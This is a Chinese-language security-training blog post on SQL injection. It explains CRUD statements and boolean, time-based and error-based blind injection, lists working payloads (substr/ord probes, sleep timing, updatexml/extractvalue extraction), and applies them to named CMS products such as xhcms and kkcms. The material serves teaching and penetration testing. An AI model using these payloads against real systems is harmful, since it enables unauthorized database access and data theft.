---
layout: post
title: "第56天Web攻防-SQL注入增删改查盲注延时布尔报错有无回显错误处理审计复盘"
date: 2025-03-12 22:05:06 +0800
description: "or if(ord(substr(database(),2,1))=107,sleep(1),0)->判断数据库第二位ascii码是否等于107。or if(ord(left(database(),1))=107,sleep(1),0) ->判断数据库第一位ascii码是否等于107。left(database(),1)，database() #left(a,b)从左侧截取a的前b位。length(database())=8 #判断数据库database()名的长度。"
keywords: "第56天：Web攻防-SQL注入&增删改查&盲注&延时&布尔&报错&有无回显&错误处理&审计复盘"
categories: ['未分类']
tags: ['数据库', 'Sql']
artid: "146214240"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146214240
    alt: "第56天Web攻防-SQL注入增删改查盲注延时布尔报错有无回显错误处理审计复盘"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146214240
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146214240
cover: https://bing.ee123.net/img/rand?artid=146214240
image: https://bing.ee123.net/img/rand?artid=146214240
img: https://bing.ee123.net/img/rand?artid=146214240
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     第56天：Web攻防-SQL注入&amp;增删改查&amp;盲注&amp;延时&amp;布尔&amp;报错&amp;有无回显&amp;错误处理&amp;审计复盘
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <div>
     <span style="background-color:#ffd900">
      #知识点
     </span>
    </div>
    <div>
    </div>
    <div>
     <p style="margin-left:0; margin-right:0; text-align:justify">
      <span style="color:#000000">
       1、Web攻防-SQL注入-操作方法&amp;增删改查
      </span>
     </p>
     <p style="margin-left:0; margin-right:0; text-align:justify">
      <span style="color:#000000">
       2、Web攻防-SQL注入-布尔&amp;延时&amp;报错&amp;盲注
      </span>
     </p>
     <div>
     </div>
     <div>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        <span style="background-color:#ffd900">
         一、增删改查
        </span>
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        1、功能：数据查询
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        查询：SELECT * FROM news where id=$id
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        2、功能：新增用户，添加新闻等
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        增加：INSERT INTO news (字段名) VALUES (数据)
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        3、功能：删除用户，删除新闻等
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        删除：DELETE FROM news WHERE id=$id
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        4、功能：修改用户，修改文章等
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        修改：UPDATE news SET id=$id
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        <span style="background-color:#ffd900">
         二、布尔&amp;报错&amp;延迟
        </span>
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#fe2c24">
        盲注
       </span>
       <span style="color:#0d0016">
        就是在注入过程中，获取的
       </span>
       <span style="color:#fe2c24">
        数据不能回显
       </span>
       <span style="color:#0d0016">
        至前端页面。
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#fe2c24">
        解决：常规的联合查询注入union select不行的情况
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <img alt="" height="869" src="https://i-blog.csdnimg.cn/direct/d635ced9300d4d77bc75bede3c6ba08a.png" width="1716"/>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        我们可以知道盲注分为以下三类：
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        1、基于
       </span>
       <span style="color:#fe2c24">
        布尔的SQL盲注
       </span>
       <span style="color:#0d0016">
        -逻辑判断
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        regexp,like,ascii,left,ord,mid
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#fe2c24">
        布尔：
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        and length(database())=7;
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        and left(database(),1)='p';
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        and left(database(),2)='pi';
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        and substr(database(),1,1)='p';
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        and substr(database(),2,1)='i';
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        and ord(left(database(),1))=112;
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        2、基于
       </span>
       <span style="color:#fe2c24">
        时间的SQL盲注
       </span>
       <span style="color:#0d0016">
        -延时判断
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        if,sleep
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#fe2c24">
        延时：
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        and sleep(1);
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        and if(1&gt;2,sleep(1),0);
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        and if(1&lt;2,sleep(1),0);
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        3、基于
       </span>
       <span style="color:#fe2c24">
        报错的SQL盲注
       </span>
       <span style="color:#0d0016">
        -报错回显
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        floor，updatexml，extractvalue
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#fe2c24">
        报错：
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)#
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)))#
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        <span style="background-color:#ffd900">
         参考：重要
        </span>
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        like 'ro%' #判断ro或ro...是否成立
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        regexp '^xiaodi[a-z]' #匹配xiaodi及xiaodi...等
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        if(条件,5,0) #条件成立 返回5 反之 返回0
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        sleep(5) #SQL语句延时执行5秒
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        mid(a,b,c) #从位置b开始，截取a字符串的c位
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#fe2c24">
        substr(a,b,c) #从位置b开始，截取字符串a的c长度
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        left(database(),1)，database() #left(a,b)从左侧截取a的前b位
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        length(database())=8 #判断数据库database()名的长度
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        ord=ascii ascii(x)=97 #判断x的ascii码是否等于97
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#fe2c24">
        4、三种盲注方式需要满足的条件
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#fe2c24">
        ①基于延时注入：都不需要
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        or if(1=1,sleep(5),0)#
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        没报错没输出-&gt;延时注入
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        x' or if(1=1,sleep(5),0)#
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        x' or if((select database())='news_management',sleep(1),sleep(0))#
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#fe2c24">
        ②基于布尔注入
       </span>
       <span style="color:#0d0016">
        ：
       </span>
       <span style="color:#fe2c24">
        有数据库执行的结果有输出
       </span>
       <span style="color:#0d0016">
        ，为判断标准条件
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        or length(database())=6#
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        select有输出和insert没输出-&gt;布尔注入
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        x' or length(database())=15#
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#fe2c24">
        ③基于报错注入
       </span>
       <span style="color:#0d0016">
        ：有数据库报错处理判断标准条件
       </span>
       <span style="color:#fe2c24">
        (即容错处理
       </span>
       <span style="color:#0d0016">
        ）
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        or updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        select没报错和insert有报错-&gt;报错注入
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        x' or updatexml(1,concat(0x7e,(version())),0) or '#
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <img alt="" height="960" src="https://i-blog.csdnimg.cn/direct/563922df1a624cdd95258cdaea94411c.png" width="1359"/>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        参考：
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        <span style="color:#0d0016">
         <a href="https://www.jianshu.com/p/bc35f8dd4f7c" rel="nofollow" title="12种报错注入+万能语句 - 简书">
          12种报错注入+万能语句 - 简书
         </a>
        </span>
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       https://www.jianshu.com/p/bc35f8dd4f7c
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <img alt="" height="704" src="https://i-blog.csdnimg.cn/direct/c4910404d47a46889330adf816840593.png" width="935">
        <br/>
       </img>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        https://www.cnblogs.com/impulse-/p/14227189.html
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <img alt="" height="830" src="https://i-blog.csdnimg.cn/direct/2925acf157e246f0bfb4807a9a1f8f69.png" width="1200"/>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        <span style="background-color:#ffd900">
         三、实际案例：报错&amp;延时
        </span>
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        1、
       </span>
       <span style="color:#fe2c24">
        xhcms系统
       </span>
       <span style="color:#0d0016">
        -insert报错
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        ' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and '
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <img alt="" height="956" src="https://i-blog.csdnimg.cn/direct/7b171866a7f242e4a9d8d7d53152a32f.png" width="1917"/>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <img alt="" height="886" src="https://i-blog.csdnimg.cn/direct/f7e0a5b8aa9f4a15bee618ca5f045bc0.png" width="1272"/>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <img alt="" height="381" src="https://i-blog.csdnimg.cn/direct/ac970065a85045659a3a26c87007db0f.png" width="1721"/>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        2、
       </span>
       <span style="color:#fe2c24">
        kkcms系统
       </span>
       <span style="color:#0d0016">
        -delete延时
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        or if(1=1,sleep(5),0)
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        or length(database())=5
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        or if(ord(left(database(),1))=107,sleep(1),0) -&gt;判断数据库第一位ascii码是否等于107
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        or if(ord(substr(database(),2,1))=107,sleep(1),0)-&gt;判断数据库第二位ascii码是否等于107
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <img alt="" height="851" src="https://i-blog.csdnimg.cn/direct/332ddf5aa69e46aeb50c7c0124a1a7e9.png" width="1450"/>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <img alt="" height="795" src="https://i-blog.csdnimg.cn/direct/ec13dd4d7b314ad48b9c034244269033.png" width="1611"/>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        3、学员学就用：
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:justify">
       <span style="color:#0d0016">
        JSON注入文档
       </span>
      </p>
     </div>
    </div>
   </div>
  </div>
 </article>
 <p alt="68747470733a:2f2f626c6f672e6373646e2e6e65742f77757361696379712f:61727469636c652f64657461696c732f313436323134323430" class_="artid" style="display:none">
 </p>
</div>


